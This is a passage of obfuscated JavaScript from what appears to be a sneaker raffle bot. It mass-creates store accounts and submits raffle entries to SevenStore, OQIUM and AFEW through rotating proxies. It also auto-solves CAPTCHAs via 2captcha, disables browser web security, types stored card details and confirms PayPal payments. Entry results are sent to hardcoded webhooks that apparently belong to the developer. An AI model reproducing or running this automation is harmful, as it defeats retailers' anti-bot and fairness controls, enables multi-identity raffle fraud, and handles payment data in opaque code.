                if (_0x1edf97 != 'ver') {
                    _0x40845b(_0x1fc15d[_0x29ae69], _0x475b44);
                    var _0x162e97 = await _0x1653b0(_0x1fc15d[_0x29ae69], _0x475b44, 'dev', ![]), _0x35648b = await _0x1653b0(_0x1fc15d[_0x29ae69], _0x475b44, 'pub', ![]);
                    const _0x3dace1 = {
                        'succesDEVMSG': { 'embeds': [_0x162e97] },
                        'succesPUBMSG': { 'embeds': [_0x35648b] }
                    };
                    if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                        try {
                            await _0xf7d9ce(_0x5a0dc7['webhook'], _0x3dace1['succesDEVMSG']);
                        } catch {
                        }
                    await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x3dace1['succesDEVMSG']), await _0x207ff4(0xc8);
                    try {
                        await _0xf7d9ce(_0xcaa949, _0x3dace1['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x1edf97 == 'ver') {
                        var _0x162e97 = await _0x1653b0(null, _0x475b44, 'ver', ![]);
                        const _0x30be17 = {
                            'succesDEVMSG': { 'embeds': [_0x162e97] },
                            'succesPUBMSG': { 'embeds': [_0x35648b] }
                        };
                        await _0xf7d9ce(_0x29cd31, _0x30be17['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x1edf97 != 'ver') {
                    var _0x487cad = '' + _0x38ed29, _0x4df820 = await _0x1653b0(_0x1fc15d[_0x29ae69], _0x475b44, 'dev', !![], _0x487cad), _0x398d12 = {};
                    _0x398d12['errorDEV'] = { 'embeds': [_0x4df820] }, _0x3fbd0e(_0x1fc15d[_0x29ae69], _0x475b44), _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x398d12['errorDEV']), await _0xf7d9ce(_0x227865, _0x398d12['errorDEV']);
                }
                _0x5ef42f(console['log'](_0x13cc99() + '\x20[' + _0x475b44['name'] + ']\x20Task\x20' + (_0x29ae69 + 0x1) + ':\x20' + _0x38ed29));
            }
        };
        try {
            _0x1edf97 === 'ver' ? console['log'](_0x13cc99() + '\x20[' + _0x475b44['name'] + ']\x20Task\x20' + (_0x29ae69 + 0x1) + ':\x20Verifying.') : console['log'](_0x13cc99() + '\x20[' + _0x475b44['name'] + ']\x20Task\x20' + (_0x29ae69 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x227216['data']['attributes']['email']), _0x331b3f(_0x264d1c, callback);
        } catch (_0x2565e1) {
            console['log'](_0x13cc99() + '\x20Task\x20' + (_0x29ae69 + 0x1) + ':\x20' + _0x2565e1);
        }
    });
}
;
async function _0x49f651(_0x3dbb1c, _0x21c18e) {
    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5a0dc7['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xaf49f4 = 0x0; _0xaf49f4 < bouncewear['length']; _0xaf49f4++) {
        await _0x5e3796(bouncewear, _0xaf49f4);
        if (bouncewear[_0xaf49f4]['Email'] == '' || bouncewear[_0xaf49f4]['Password'] == '' || bouncewear[_0xaf49f4]['FirstName'] == '' || bouncewear[_0xaf49f4]['LastName'] == '') {
            console['log'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5a0dc7['useRandomProxy'] = ![])
            var _0x4e6c41 = _0x32e18d()[_0xaf49f4]['split'](':');
        else
            var _0x2579ef = Math['round'](Math['random']() * (_0x32e18d()['length'] - 0x1)), _0x4e6c41 = _0x32e18d()[_0x2579ef]['split'](':');
        const _0x3faf74 = await _0x512dd9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4e6c41[0x0] + ':' + _0x4e6c41[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x477cae = await _0x3faf74['newPage']();
            await _0x477cae['authenticate']({
                'username': '' + _0x4e6c41[0x2],
                'password': '' + _0x4e6c41[0x3]
            }), console['log'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x477cae['setRequestInterception'](!![]), _0x477cae['on']('request', _0xd67000 => {
                _0xd67000['resourceType']() === 'image' || _0xd67000['resourceType']() === 'font' || _0xd67000['resourceType']() === 'media' ? _0xd67000['abort']() : _0xd67000['continue']();
            }), await _0x477cae['goto'](_0x3dbb1c), await _0x207ff4(0xbb8), await _0x477cae['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Filling\x20information'), await _0x477cae['type']('#RegisterForm-FirstName', '' + bouncewear[_0xaf49f4]['FirstName']), await _0x207ff4(0x226), await _0x477cae['type']('#RegisterForm-LastName', '' + bouncewear[_0xaf49f4]['LastName']), await _0x207ff4(0x226), await _0x477cae['type']('#RegisterForm-email', '' + bouncewear[_0xaf49f4]['Email']), await _0x207ff4(0x226), await _0x477cae['type']('#RegisterForm-password', '' + bouncewear[_0xaf49f4]['Password']), await _0x207ff4(0x226), await _0x477cae['click']('#marketing'), console['log'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Submitting..'), await _0x477cae['$eval']('#RegisterForm', _0x21c8cc => _0x21c8cc['submit']()), await _0x207ff4(0x1f40), console['log'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x477cae['solveRecaptchas'](), await _0x477cae['click']('.shopify-challenge__button.btn');
            async function _0x70d3a5() {
                for (var _0x5cc957 = 0x0; _0x5cc957 < 0x4; _0x5cc957++) {
                    try {
                        console['log']('try'), await _0x477cae['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20' + _0x191fc2['red']('Catpcha\x20failed,\x20retrying..')), await _0x477cae['solveRecaptchas'](), await _0x477cae['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x70d3a5(), console['log'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x207ff4(0x1f4);
            try {
                await _0x477cae['waitForSelector']('.featured-title'), await _0x207ff4(0x1f4), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0xaf49f4]['Email'] + '\x20Generated!')), _0x71872f['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0xaf49f4]['Email'] + ',' + bouncewear[_0xaf49f4]['Password']), console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x21c18e['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0xaf49f4]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x5bcbcf) {
                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5bcbcf));
            }
        } catch (_0x11244e) {
            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0xaf49f4 + 0x1) + '\x20:\x20' + _0x11244e));
        } finally {
            _0x3faf74 && _0x3faf74['close'](), console['log']('Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
        }
    }
}
async function _0x23839b(_0x17289d, _0x285252, _0x2f32d3) {
    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5a0dc7['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2d4cde = 0x0; _0x2d4cde < _0x285252['length']; _0x2d4cde++) {
        _0x2164fd(_0x17289d['name'] + '\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20/\x20' + _0x285252['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517);
        var _0x4075f9 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1d42cd
                },
                {
                    'name': 'Product',
                    'value': '' + _0x285252[_0x2d4cde]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x285252[_0x2d4cde]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5a0dc7['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x5a0dc7['version']
                }
            ]
        }];
        const _0x464bcb = { 'embeds': _0x4075f9 };
        await _0x5e3796(_0x285252, _0x2d4cde);
        if (_0x285252[_0x2d4cde]['Email'] == '' || _0x285252[_0x2d4cde]['Password'] == '' || _0x285252[_0x2d4cde]['FirstName'] == '' || _0x285252[_0x2d4cde]['LastName'] == '') {
            console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x285252[_0x2d4cde]['Password'] == '' || _0x285252[_0x2d4cde]['Password'] == undefined) && (_0x285252[_0x2d4cde]['Password'] = 'ErehsaWonRaj1!');
        if (_0x5a0dc7['useRandomProxy'] = ![])
            var _0x26f18d = _0x2f32d3[_0x2d4cde]['split'](':');
        else
            var _0x473532 = Math['round'](Math['random']() * (_0x2f32d3['length'] - 0x1)), _0x26f18d = _0x2f32d3[_0x473532]['split'](':');
        const _0x24aa0c = await _0x512dd9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x26f18d[0x0] + ':' + _0x26f18d[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x448c69 = await _0x24aa0c['newPage']();
            await _0x448c69['authenticate']({
                'username': '' + _0x26f18d[0x2],
                'password': '' + _0x26f18d[0x3]
            }), console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Getting\x20Session'), await _0x448c69['setRequestInterception'](!![]), _0x448c69['on']('request', _0x57c0da => {
                _0x57c0da['resourceType']() === 'image' || _0x57c0da['resourceType']() === 'font' || _0x57c0da['resourceType']() === 'media' ? _0x57c0da['abort']() : _0x57c0da['continue']();
            }), await _0x448c69['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x448c69['goto']('' + _0x285252[_0x2d4cde]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x448c69['waitForSelector']('#btnPdpAtb'), console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x285252[_0x2d4cde]['Size']);
            const _0x1243cd = await _0x448c69['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x53e25f => {
                return _0x53e25f['map'](_0x4ff113 => _0x4ff113['innerText']);
            }), _0x14a17b = await _0x448c69['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x4693fb = ![];
            if (_0x285252[_0x2d4cde]['Size'] == 'RANDOM') {
                var _0x416038 = Math['round'](Math['random']() * (_0x14a17b['length'] - 0x1));
                await _0x14a17b[_0x416038]['click']();
            } else
                for (var _0x4825f6 = 0x0; _0x4825f6 < _0x1243cd['length']; _0x4825f6++) {
                    if (_0x1243cd[_0x4825f6] != _0x285252[_0x2d4cde]['Size'])
                        continue;
                    try {
                        await _0x14a17b[_0x4825f6]['click']();
                    } catch {
                        console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x4693fb = !![];
                    }
                }
            if (_0x4693fb)
                continue;
            await _0x207ff4(0x578), await _0x448c69['click']('#btnPdpAtb'), await _0x448c69['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x207ff4(0x3e8), console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x448c69['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x448c69['waitForSelector']('#email'), await _0x448c69['type']('#email', _0x285252[_0x2d4cde]['Email']), await _0x207ff4(0x226), await _0x448c69['click']('#guest-submit'), await _0x207ff4(0x1b58), console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Filling\x20Information'), await _0x448c69['waitForSelector']('#firstname'), await _0x448c69['type']('#firstname', _0x285252[_0x2d4cde]['FirstName'], 0x1f4), await _0x207ff4(0x190), await _0x448c69['waitForSelector']('#surname'), await _0x448c69['type']('#surname', _0x285252[_0x2d4cde]['LastName'], 0x1f4), await _0x207ff4(0x190), await _0x448c69['waitForSelector']('#mobile'), await _0x448c69['type']('#mobile', _0x285252[_0x2d4cde]['Phone'], 0x1f4), await _0x207ff4(0x190), await _0x448c69['click']('#enterManualDiv'), await _0x207ff4(0x5dc), await _0x448c69['waitForSelector']('#address1'), await _0x448c69['type']('#address1', _0x285252[_0x2d4cde]['Address1'] + '\x20' + _0x285252[_0x2d4cde]['HouseNumber'], 0x226), await _0x207ff4(0x384), await _0x448c69['waitForSelector']('#address2'), await _0x448c69['type']('#address2', '' + _0x285252[_0x2d4cde]['Address2'], 0x226), await _0x207ff4(0x320);
            const _0x11f75c = await _0x448c69['$$eval']('#countryselect_view3\x20>\x20option', _0x24c6b4 => {
                return _0x24c6b4['map'](_0x2a8dcd => _0x2a8dcd['value']);
            });
            var _0x582ad0;
            for (var _0x31a2e0 = 0x0; _0x31a2e0 < _0x11f75c['length']; _0x31a2e0++) {
                if (_0x11f75c[_0x31a2e0]['startsWith']('' + _0x285252[_0x2d4cde]['Country'])) {
                    _0x582ad0 = _0x11f75c[_0x31a2e0];
                    break;
                }
                continue;
            }
            await _0x448c69['select']('#countryselect_view3', '' + _0x582ad0), await _0x448c69['waitForSelector']('#address4'), await _0x448c69['type']('#address4', '' + _0x285252[_0x2d4cde]['City'], 0x1f4), await _0x207ff4(0x384), await _0x448c69['waitForSelector']('#postcode'), await _0x448c69['type']('#postcode', '' + _0x285252[_0x2d4cde]['Zip'], 0x1f4), await _0x207ff4(0x4b0);
            const _0x5d8f00 = await _0x448c69['url']();
            console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x3af742 = _0x5d8f00['split']('?')[0x1], _0x33b084 = await _0x448c69['$']('#co_address_submit');
            await _0x33b084['evaluate'](_0x58e397 => _0x58e397['click']()), await _0x207ff4(0x1388), await _0x448c69['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x3af742), console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x448c69['waitForSelector']('#paymentbuttons'), await _0x207ff4(0x1388), await _0x448c69['click']('#paymentbuttons\x20>\x20div'), await _0x207ff4(0x1c2), await _0x448c69['waitForSelector']('#card-number'), await _0x448c69['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x4a7e53 = await _0x448c69['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x82e909 = await _0x4a7e53['contentFrame']();
            await _0x82e909['waitForSelector']('.InputContainer'), await _0x82e909['click']('.InputContainer\x20>\x20input'), await _0x207ff4(0x578), await _0x448c69['type']('#card-number', '' + _0x285252[_0x2d4cde]['CreditNumber']), await _0x207ff4(0xfa), await _0x448c69['type']('#card-expiry', '' + _0x285252[_0x2d4cde]['ExpiryDate']), await _0x207ff4(0xfa), await _0x448c69['type']('#card-cvc', '' + _0x285252[_0x2d4cde]['CVV']), await _0x207ff4(0x7d0), await _0x448c69['click']('#card-button'), console['log'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x448c69['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0xf7d9ce(_0x565446, _0x464bcb);
            } catch {
                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x203DS\x20Failed')), _0x4075f9[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4075f9[0x0]['description'] = '3DS\x20Failed', await _0xf7d9ce(_0x227865, _0x464bcb);
            }
        } catch (_0x34e174) {
            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x17289d['name'] + ']\x20Task\x20' + (_0x2d4cde + 0x1) + '\x20:\x20' + _0x34e174)), _0x4075f9[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4075f9[0x0]['description'] = '' + _0x34e174, await _0xf7d9ce(_0x227865, _0x464bcb);
        } finally {
            _0x24aa0c && _0x24aa0c['close']();
            if (_0x2d4cde + 0x1 == _0x285252['length']) {
                console['log'](_0x191fc2['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x207ff4(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x5a0dc7['AfewDelay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['AfewDelay']);
        }
    }
}
async function _0x5cc8f4(_0x3b9b71, _0x3c857a, _0x5944ee, _0x2b2136, _0x2a88ad) {
    var _0x288595, _0x5dd740 = {}, _0x459936 = [], _0x3b9e40 = {}, _0x43ce65 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x2b2136 && (_0x2b2136 = {});
    if (_0x3c857a != 'ver') {
        _0x2164fd(_0x5944ee['name'] + '\x20Task\x20' + (_0x3b9b71 + 0x1) + '\x20/\x20' + _0x2b2136['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x2b2136, _0x3b9b71), _0x459936 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1d42cd
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2b2136[_0x3b9b71]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5a0dc7['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2071e6
                }
            ]
        }], _0x3b9e40 = { 'embeds': _0x459936 }, _0x5dd740 = _0x5944ee['data'];
        _0x3c857a == 'exp' ? _0x5dd740['data']['attributes']['email'] = '' + _0x2b2136[_0x3b9b71]['FirstName'] + _0x2b2136[_0x3b9b71]['LastName'] + _0x5a0dc7['catchall'] : _0x5dd740['data']['attributes']['email'] = '' + _0x2b2136[_0x3b9b71]['Email'];
        if (_0x2b2136[_0x3b9b71]['Size'] == 'RANDOM') {
        }
        _0x5dd740['data']['attributes']['properties']['$first_name'] = '' + _0x2b2136[_0x3b9b71]['FirstName'], _0x5dd740['data']['attributes']['properties']['$last_name'] = '' + _0x2b2136[_0x3b9b71]['LastName'], _0x5dd740['data']['attributes']['properties']['$address1'] = _0x2b2136[_0x3b9b71]['Address1'] + '\x20' + _0x2b2136[_0x3b9b71]['Address2'] + '\x20' + _0x2b2136[_0x3b9b71]['HouseNumber'], _0x5dd740['data']['attributes']['properties']['$zip'] = '' + _0x2b2136[_0x3b9b71]['Zip'], _0x5dd740['data']['attributes']['properties']['$city'] = '' + _0x2b2136[_0x3b9b71]['City'], _0x5dd740['data']['attributes']['properties']['$country'] = '' + _0x2b2136[_0x3b9b71]['Country'], _0x5dd740['data']['attributes']['properties']['Size'] = '' + _0x2b2136[_0x3b9b71]['Size'], _0x5dd740['data']['attributes']['properties']['$phone_number'] = '' + _0x2b2136[_0x3b9b71]['Phone'], _0x5dd740['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2b2136[_0x3b9b71]['Follower'];
    }
    if (_0x5a0dc7['useRandomProxy'] = ![])
        var _0x4dbb70 = _0x2a88ad[_0x3b9b71]['split'](':');
    else
        var _0x394a54 = Math['round'](Math['random']() * (_0x2a88ad['length'] - 0x1)), _0x4dbb70 = _0x2a88ad[_0x394a54]['split'](':');
    var _0x3625b6 = {
        'jar': _0xf73368,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x5944ee['url'],
        'headers': _0x5944ee['headers'],
        'body': JSON['stringify'](_0x5dd740),
        'proxy': 'http://' + _0x4dbb70[0x2] + ':' + _0x4dbb70[0x3] + '@' + _0x4dbb70[0x0] + ':' + _0x4dbb70[0x1]
    };
    return _0x3c857a != 'ver' && (_0x3625b6['url'] = _0x5944ee['url'], _0x3625b6['headers'] = _0x5944ee['headers']), _0x3c857a == 'ver' && (_0x3625b6['method'] = 'GET'), new Promise(function (_0x32f49f, _0x51d6f9) {
        callback = async (_0x2f0132, _0x4a6699, _0x366df5) => {
            if (!_0x2f0132 && _0x4a6699['statusCode'] == 0xca || !_0x2f0132 && _0x4a6699['statusCode'] == 0xc8) {
                if (_0x3c857a != 'ver') {
                    var _0x40a6fb = await _0x1653b0(_0x2b2136[_0x3b9b71], _0x5944ee, 'dev', ![]), _0x39887a = await _0x1653b0(_0x2b2136[_0x3b9b71], _0x5944ee, 'pub', ![]);
                    const _0x3e6738 = {
                        'succesDEVMSG': { 'embeds': [_0x40a6fb] },
                        'succesPUBMSG': { 'embeds': [_0x39887a] }
                    };
                    if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                        try {
                            await _0xf7d9ce(_0x5a0dc7['webhook'], _0x3e6738['succesDEVMSG']);
                        } catch {
                        }
                    await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x3e6738['succesDEVMSG']), await _0x207ff4(0xc8);
                    try {
                        await _0xf7d9ce(_0xcaa949, _0x3e6738['succesPUBMSG']);
                    } catch {
                    }
                    _0x40845b(_0x2b2136[_0x3b9b71], _0x5944ee);
                }
                _0x32f49f(console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x5944ee['name'] + ']\x20Task\x20' + (_0x3b9b71 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x3c857a != 'ver') {
                    var _0x5b58d7 = '' + _0x2f0132, _0xb58020 = await _0x1653b0(_0x2b2136[_0x3b9b71], _0x5944ee, 'dev', !![], _0x5b58d7), _0x5e0c34 = {};
                    _0x5e0c34['errorDEV'] = { 'embeds': [_0xb58020] }, _0x3fbd0e(_0x2b2136[_0x3b9b71], _0x5944ee), _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x5e0c34['errorDEV']), await _0xf7d9ce(_0x227865, _0x5e0c34['errorDEV']);
                }
                _0x51d6f9(console['log'](_0x13cc99() + '\x20[' + _0x5944ee['name'] + ']\x20Task\x20' + (_0x3b9b71 + 0x1) + ':\x20' + _0x2f0132));
            }
        };
        try {
            _0x3c857a != 'ver' && console['log'](_0x13cc99() + '\x20[' + _0x5944ee['name'] + ']\x20Task\x20' + (_0x3b9b71 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5dd740['data']['attributes']['email']), _0x331b3f(_0x3625b6, callback);
        } catch (_0x39788d) {
            console['log'](_0x13cc99() + '\x20Task\x20' + (_0x3b9b71 + 0x1) + ':\x20' + _0x39788d);
        }
    });
}
;
async function _0x26cb09(_0x395bec, _0x2de4a8, _0x2496cd) {
    var _0x5719fa;
    _0x2164fd('' + _0x2de4a8);
    var _0x5c212b = _0x2496cd[0x0]['split'](':');
    const _0x161e8c = await _0x512dd9['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x5c212b[0x0] + ':' + _0x5c212b[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x13cc99() + '\x20[' + _0x2de4a8 + ']\x20Getting\x20Session');
        const _0x5035e9 = await _0x161e8c['newPage']();
        await _0x5035e9['authenticate']({
            'username': '' + _0x5c212b[0x2],
            'password': '' + _0x5c212b[0x3]
        }), await _0x5035e9['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5035e9, await _0x5035e9['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x13cc99() + '\x20[' + _0x2de4a8 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5035e9['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x13cc99() + '\x20[' + _0x2de4a8 + ']\x20Successfully\x20logged\x20in'), await _0x207ff4(0x2710);
        } catch (_0x334ad5) {
            throw new Error('Login\x20session\x20expired\x20' + _0x334ad5);
        }
        for (var _0x4f14f2 = 0x0; _0x4f14f2 < _0x395bec['length']; _0x4f14f2++) {
            console['log'](_0x13cc99() + '\x20[' + _0x2de4a8 + ']\x20Task\x20' + (_0x4f14f2 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x2164fd(_0x2de4a8 + '\x20Task\x20' + (_0x4f14f2 + 0x1) + '\x20/\x20' + _0x395bec['length']);
            const _0x2e06a9 = await _0x161e8c['newPage']();
            await _0x2e06a9['goto']('' + _0x395bec[_0x4f14f2], { 'waitUntil': 'networkidle2' }), await _0x207ff4(0xbb8);
            try {
                const _0x1e3ea1 = await _0x2e06a9['$']('#challenge-heading');
                _0x1e3ea1 && (console['log'](_0x13cc99() + '\x20[' + _0x2de4a8 + ']\x20Task\x20' + (_0x4f14f2 + 0x1) + '\x20:\x20' + _0x191fc2['yellow']('2FA\x20Required')), await _0x2e06a9['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x207ff4(0x61a8), await _0x2e06a9['waitForSelector']('#payment-submit-btn'), await _0x2e06a9['$eval']('#payment-submit-btn', _0x38c3e9 => _0x38c3e9['click']()), await _0x2e06a9['click']('#payment-submit-btn');
                try {
                    await _0x2e06a9['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x207ff4(0x5dc), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x2de4a8 + ']\x20Task\x20' + (_0x4f14f2 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x12c940) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x12c940['message']);
                } finally {
                    await _0x2e06a9['close'](), await _0x207ff4(0x4650);
                }
            } catch (_0x34da4a) {
                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x2de4a8 + ']\x20Task\x20' + (_0x4f14f2 + 0x1) + '\x20:\x20' + _0x34da4a));
            }
        }
    } catch (_0x4b579a) {
        console['log'](_0x191fc2['red']('' + _0x4b579a));
    } finally {
        await _0x161e8c['close']();
    }
}
const _0x3f8151 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x232119, _0x2a52dc, _0x2b92c2) {
                for (var _0x582f11 = 0x0; _0x582f11 < _0x2a52dc['length']; _0x582f11++) {
                    _0x5a0dc7['AfewDelay'] = _0x5a0dc7['delay'];
                    var _0x392ad1;
                    if (_0x29f8cf != 'yes')
                        var _0x29f8cf = '', _0x508f98 = 0x0;
                    var _0x5ef619 = _0x2a52dc[_0x582f11]['Url'];
                    _0x2164fd(_0x232119['name'] + '\x20Task\x20' + (_0x582f11 + 0x1) + '\x20/\x20' + _0x2a52dc['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x2a52dc, _0x582f11);
                    var _0x2a0fcb = await _0x1653b0(_0x2a52dc[_0x582f11], _0x232119, 'dev', ![]), _0x500890 = await _0x1653b0(_0x2a52dc[_0x582f11], _0x232119, 'pub', ![]);
                    const _0x5e7bec = {
                        'succesDEVMSG': { 'embeds': [_0x2a0fcb] },
                        'succesPUBMSG': { 'embeds': [_0x500890] }
                    };
